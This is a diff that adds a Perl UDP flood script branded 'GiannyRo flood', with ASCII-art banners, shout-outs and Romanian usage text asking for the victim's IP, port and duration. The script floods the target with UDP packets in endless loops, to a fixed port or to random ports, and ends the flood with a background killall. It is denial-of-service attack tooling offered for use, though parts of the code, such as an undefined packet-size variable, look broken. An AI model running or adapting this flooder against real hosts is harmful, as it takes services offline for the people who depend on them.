@@ -1,0 +1,81 @@
+#!/usr/bin/perl
+#####################################################
+# GiannyRo flood.
+#
+# gr33ts: meth, etech, skrilla, datawar, fr3aky, etc.
+#
+# --/flood
+######################################################
+
+use Socket;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=3) {
+ printf "$0 <IP-ul victimei> <Port-ul> <Durata flood>\n";
+ printf "if arg1/2 =0, randports/continous packets.\n";
+ exit(1);
+}
+
+my ($ip,$port,$size,$time);
+ $ip=$ARGV[0];
+ $port=$ARGV[1]; 
+ $time=$ARGV[2];
+
+socket(crazy, PF_INET, SOCK_DGRAM, 200);
+    $iaddr = inet_aton("$ip");
+
+printf "                                                                       \n";          
+printf "                `.-:/+ossso+:-`     ```````                            \n";      
+printf "             ``.-:oyhmNNMMMNNddy/-`.:::-----`                          \n";      
+printf "           ```-oyhhhdMMMMMNhs+MNm//s-`    .:-.                         \n";      
+printf "         ```-shsyyhdNMMMMN:/osNMNmmd+      .:-                         \n";      
+printf "        . `+dy/shdNMMMMMMNydNMMMmyhmMy`    `/:`                        \n";      
+printf "       .`.sNhyhdmMMMMMMMMMMMMMMNhoNMNNy    .:-                         \n";      
+printf "      -.-oMdddmNMMMMMMMMMMMMMMNdydMMmdM/   ::-        `.-..`           \n";       
+printf "      /-+NMNNNMMMMMMMMMMMMMMMMMMMMMMmhmh   /-`      `.::.-::.`         \n";      
+printf "     `+ohMNMMMMMMMMMMMMMMMMMMMMMMMMMdhym  `/-`     `-:-    -:-`        \n";      
+printf "     `symNmMMMMMMM #RooT:Gyno MMMMMMMMNhood   /:`    `-:-    ` ::-``   `` \n";      
+printf "      odNMNMMMMM SUBSCRIBE MMMMMMMMMMmy-s+   -:-.``.-:-`     `.:-..```   \n";       
+printf "      -hNMMMMMMMMMMMMMMMMMMMMMMMMMNh::h`    .------`      `.-..`..```  \n";      
+printf "       /mNNNMMMMMMMMMMMMMMMMMMMMMNy:-s.       ```       ```.......`    \n";         
+printf "        :dNNNNNNNNNMMMMMNNNNNNNNms:/s.                      .``.. `    \n";         
+printf "        `-smNNNNNNNNNNNNNNNNNNmy+oy+.````                  ``   .      \n";         
+printf "        `.-+hmNNNNNNNNNNNNNNmdhhdy/:--..````               `           \n";         
+printf "         `.-/oydmNNNNNNNNNNNmmhyo+/:-..```                             \n";         
+printf "            ``.-://++oooo++//:--..```                                  \n";
+printf "  Flood Has Started/Floodul a inceput                                                   \n";
+printf "  Flood By                                                                           \n";                            
+printf "    ███████  ██      ██  ████    ██    ████          \n";
+printf "    ██         ██  ██    ██  ██  ██  ██    ██        \n";
+printf "    ██  ███      ██      ██    ████  ██    ██       \n";
+printf "    ██   ██      ██      ██      ██  ██    ██       \n";
+printf "    ███████      ██      ██      ██    ████        \n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+ goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+ system("(sleep $time;killall -15 udp) &");
+ goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+ goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+ system("(sleep $time;killall -15 udp) &"); 
+ goto randpackets;
+}
+
+packets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ send(crazy, 1, $size, sockaddr_in($port, $iaddr));
+} 
+
+randpackets:
+for (;;) {
+ $size=$rand x $rand x $rand;
+ $port=int(rand 65500) +500;
+ send(crazy, 1, $size, sockaddr_in($port, $iaddr));
+}
